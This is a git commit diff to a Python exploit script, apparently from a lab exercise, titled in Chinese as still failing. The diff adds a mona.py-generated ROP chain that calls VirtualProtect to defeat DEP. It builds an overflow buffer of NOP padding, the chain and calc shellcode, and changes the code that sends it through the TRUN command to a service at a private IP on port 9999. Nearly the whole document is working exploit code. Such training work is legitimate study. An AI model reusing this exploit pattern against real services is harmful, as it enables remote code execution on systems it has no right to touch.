4fab998f3a7b30097c1450e37ac4bc02d1cc4c50
Systina <2358784628@qq.com>
2026-01-12 20:52:25 +0800

    p7依旧失败

--- Project_7_ROP/trigger.py
+++ Project_7_ROP/trigger.py
@@ -27,9 +27,9 @@ def create_rop_chain():
         0x758a3d05,  # XCHG EAX,EDX # ADC ESP,EDI # DEC ECX # RETN 0x0C [GDI32.dll] ** REBASED ** ASLR
         # [---INFO:gadgets_to_set_ecx:---]
         0x77276b24,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x41414141,  # Filler (RETN offset compensation)
-        0x41414141,  # Filler (RETN offset compensation)
-        0x41414141,  # Filler (RETN offset compensation)
+        0x90909090,  # Filler (RETN offset compensation)
+        0x90909090,  # Filler (RETN offset compensation)
+        0x90909090,  # Filler (RETN offset compensation)
         0x6250491a,  # &Writable location [essfunc.dll]
         # [---INFO:gadgets_to_set_edi:---]
         0x75337bd5,  # POP EDI # RETN [MSCTF.dll] ** REBASED ** ASLR
@@ -82,17 +82,52 @@ rop_chain = create_rop_chain()
 # rop_chain = create_rop_chain()
 
 
+def create_rop_chain():
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+        # [---INFO:gadgets_to_set_esi:---]
+        0x75305398,  # POP ECX # RETN [MSCTF.dll] ** REBASED ** ASLR
+        0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
+        0x752efd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR
+        # [---INFO:gadgets_to_set_ebp:---]
+        0x755af376,  # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR
+        0x625011af,  # & jmp esp [essfunc.dll]
+        # [---INFO:gadgets_to_set_ebx:---]
+        0x756a3d03,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
+        0xfffffdff,  # Value to negate, will become 0x00000201
+        0x752d2fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR
+        0x751f2996,  # XCHG EAX,EBX # RETN [user32.dll] ** REBASED ** ASLR
+        # [---INFO:gadgets_to_set_edx:---]
+        0x755b25bd,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
+        0xffffffc0,  # Value to negate, will become 0x00000040
+        0x74de0b8a,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
+        0x758a3d05,  # XCHG EAX,EDX # ADC ESP,EDI # DEC ECX # RETN 0x0C [GDI32.dll] ** REBASED ** ASLR
+        # [---INFO:gadgets_to_set_ecx:---]
+        0x73164ea5,  # POP ECX # RETN [mswsock.dll] ** REBASED ** ASLR
+        0x41414141,  # Filler (RETN offset compensation)
+        0x41414141,  # Filler (RETN offset compensation)
+        0x41414141,  # Filler (RETN offset compensation)
+        0x74d30de2,  # &Writable location [SspiCli.dll] ** REBASED ** ASLR
+        # [---INFO:gadgets_to_set_edi:---]
+        0x75640a31,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR
+        0x74e1ad68,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
+        # [---INFO:gadgets_to_set_eax:---]
+        0x74df198b,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
+        0x90909090,  # nop
+        # [---INFO:pushad:---]
+        0x7524b030,  # PUSHAD # RETN [user32.dll] ** REBASED ** ASLR
+    ]
+    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)
 
-buffer = b"A"*2004 + rop_chain +b"\x90"*16 +shellcode_calc+b"C"*(5004-2004-len(rop_chain)-16- len(shellcode_calc))
+
+rop_chain = create_rop_chain()
+
+buffer = b"\x90"*2004 + rop_chain +b"\x90"*16 +shellcode_calc+b"C"*(5004-2004-len(rop_chain)-16- len(shellcode_calc))
 #
 # buffer = b"A"*2003 +b"BBBB"+b"C"*(5000)
 
-while True:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        connect = s.connect(('192.168.58.140', 9999))
-        s.send(b'TRUN .:/' + buffer)
-        s.recv(1024)
-        s.close()
-    except:
-        pass
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect(('192.168.58.140', 9999))
+s.send(b'TRUN .:/' + buffer)
+s.recv(1024)
+s.close()
